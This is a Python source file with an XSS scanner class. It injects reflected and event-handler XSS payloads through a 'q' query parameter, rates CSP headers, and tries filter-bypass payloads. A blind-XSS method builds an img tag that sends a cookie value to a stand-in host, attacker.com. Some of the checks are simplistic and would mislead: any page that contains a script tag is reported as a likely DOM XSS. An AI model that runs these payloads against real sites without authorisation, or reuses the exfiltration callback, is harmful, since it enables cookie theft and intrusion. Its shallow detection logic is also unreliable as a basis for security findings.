import requests
from bs4 import BeautifulSoup
import re

class XSSTester:

    def __init__(self):
        self.session = requests.Session()

    def test_payload(self, url, payload):
        """
        Send the payload to the URL and check for XSS vulnerability.
        """
        try:
            # Send payload to a URL (query params, form data, etc.)
            response = self.session.get(url, params={'q': payload})
            if payload in response.text:
                print(f"Potential XSS found with payload: {payload}")
            else:
                print(f"No XSS found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")

    def test_dom_xss(self, url, payload):
        """
        Test for DOM-based XSS (requires a response that contains JS code).
        """
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find_all('script'):
                print("Potential DOM XSS vulnerability detected")
                self.test_payload(url, payload)
            else:
                print("No DOM-based XSS detected")
        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")

    def check_csp(self, url):
        """
        Check if the page has a Content Security Policy (CSP) and evaluate its strength.
        """
        try:
            response = self.session.get(url)
            csp_header = response.headers.get('Content-Security-Policy', '')
            if csp_header:
                print(f"CSP detected: {csp_header}")
                if 'script-src' in csp_header and 'unsafe-inline' in csp_header:
                    print("Weak CSP policy, allows inline scripts.")
                else:
                    print("Strong CSP policy.")
            else:
                print("No CSP header found. High risk.")
        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")

    def test_event_handler(self, url, payload):
        """
        Test for event handler-based XSS vulnerability.
        """
        try:
            response = self.session.get(url)
            if re.search(r'(<.*?on[a-zA-Z]+=[^>]+>)', response.text):
                print(f"Potential event handler XSS found in response. Injecting payload.")
                self.test_payload(url, payload)
            else:
                print("No event handler XSS detected.")
        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")

    def test_blind_xss(self, url, payload):
        """
        Test for Blind XSS vulnerabilities, where the attacker can't directly see the payload's result.
        This will test out-of-band XSS by using a callback to an attacker server.
        """
        try:
            payload_with_callback = f"'><img src='http://attacker.com?cookie={payload}' onerror='alert(1)'>"
            self.test_payload(url, payload_with_callback)
            print("Blind XSS payload injected with callback to attacker server.")
        except requests.exceptions.RequestException as e:
            print(f"Error with request: {e}")

    def test_mutation_payloads(self, url):
        """
        Try to mutate payloads to bypass XSS filters.
        """
        mutation_payloads = ['<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>']
        for payload in mutation_payloads:
            self.test_payload(url, payload)
